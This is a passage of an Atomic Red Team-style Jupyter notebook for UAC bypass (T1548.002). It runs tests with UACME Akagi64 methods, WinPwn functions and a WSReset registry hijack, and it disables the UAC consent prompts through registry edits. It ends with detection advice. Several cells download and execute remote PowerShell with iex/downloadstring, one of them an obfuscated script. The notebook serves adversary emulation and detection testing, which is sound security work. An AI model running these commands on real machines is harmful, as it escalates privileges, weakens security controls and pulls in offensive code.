    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78fd9d37",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "15803b59",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ea704f04",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 15 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cbde5135",
   "metadata": {},
   "source": "### Atomic Test #16 - UACME Bypass Method 59\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "09076524",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 16 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d63bce95",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9a66a6d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "0c9791fe",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6124d8f2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3119ca8a",
   "metadata": {},
   "source": "### Atomic Test #17 - UACME Bypass Method 61\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5cce5d99",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 17 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8e242d3f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10df7cec",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "5dbdd1af",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79bdfd91",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5f711cf8",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - WinPwn - UAC Magic",
    "UAC bypass using Magic technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "394a2cf5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "96354f63",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - WinPwn - UAC Bypass ccmstp technique",
    "UAC bypass using ccmstp technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7eb4a9b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "0acd84b6",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - WinPwn - UAC Bypass DiskCleanup technique",
    "UAC bypass using DiskCleanup technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6efb3ae2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "45f44c94",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - WinPwn - UAC Bypass DccwBypassUAC technique",
    "UAC Bypass DccwBypassUAC technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ea863cf7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "568d0b10",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key",
    "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6b874ca0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "8d9d9ab7",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b6465f1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 22 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "328fdda3",
   "metadata": {},
   "source": [
    "### Atomic Test #23 - UAC Bypass with WSReset Registry Modification",
    "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72eaee28",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "03548fc5",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Recurse -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78b2004f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 23 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7f53a4a5",
   "metadata": {},
   "source": [
    "### Atomic Test #24 - Disable UAC - Switch to the secure desktop when prompting for elevation via registry key",
    "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4241c9e3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "75799db9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe48190e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3f62f9d7",
   "metadata": {},
   "source": "## Detection\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\n\nAnalysts should monitor these Registry settings for unauthorized changes."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}